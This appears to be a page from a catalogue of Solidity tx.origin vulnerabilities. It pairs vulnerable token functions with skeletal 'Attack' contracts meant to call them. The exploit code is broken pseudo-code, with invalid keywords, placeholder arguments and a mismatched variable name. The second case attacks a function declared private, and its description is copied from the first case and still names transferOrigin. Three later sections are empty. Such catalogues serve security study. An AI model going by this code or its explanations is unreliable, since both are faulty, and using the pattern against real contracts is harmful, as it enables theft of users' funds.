Exploit Code
============

Abuse of Tx-origin Exploitation Code
------------------------------------

Tx-AVS-1
^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function transferOrigin(address _to, uint256 _value) public returns (bool) {
        require(!locked);
        require(_to != address(0));
        require(msg.sender == impl);
        require(_value <= balances[tx.origin]);  //Vulnerable position

        // SafeMath.sub will throw if there is not enough balance.
        balances[tx.origin] = balances[tx.origin].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(tx.origin, _to, _value);
        return true;
    }


Vulnerable Code 1
"""""""""""""""""

::

    function transferOrigin(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0)); //code different
        require(_value <= balances[tx.origin]);

        balances[tx.origin] = balances[tx.origin].sub(_value);
        balances[_to] = balances[_to].add(_value);

        emit Transfer(tx.origin, _to, _value);

        return true;
    }


Exploit Code
""""""""""""

::

    Contract Attack{
        address victim;
        function setVictimAddress(address _address){
            victim = _address;
        }
        function startAttack(){
            victimAddress.call(byte4(keccak256(“transferOrigin(address, uint256)”)), ..., ... );
            ...
        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position.If an malicious contract such as "Attack" to call the Victim Contract function such as "transferOrigin", Due to the 'tx.origin' ,so "Attack" can bypass the body condition. ps:"...." represent an appropriate parameter


Tx-AVS-2
^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function depositTokenFunction(address _token, uint256 _amount, address _beneficiary) private {
            tokens[_token][_beneficiary] = tokens[_token][_beneficiary].add(_amount);
            
            if(tx.origin == _beneficiary) lastActiveTransaction[tx.origin] = now;   //Vulnerable position
            
            emit Deposit(_token, _beneficiary, _amount, tokens[_token][_beneficiary]);
    }




Exploit Code
""""""""""""

::

    Contract Attack{
        address victim;
        function setVictimAddress(address _address){
            victim = _address;
        }
        function startAttack(){
            victimAddress.call(byte4(keccak256(“depositTokenFunction(address, uint256, address)”)), ..., ..., ...);
            ...
        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position.If an malicious contract such as "Attack" to call the Victim Contract function such as "transferOrigin", Due to the 'tx.origin' ,so "Attack" can bypass the body condition. ps:"...." represent an appropriate parameter


Tx-AVS-3
^^^^^^^^

Tx-AVS-4
^^^^^^^^

Tx-AVS-5
^^^^^^^^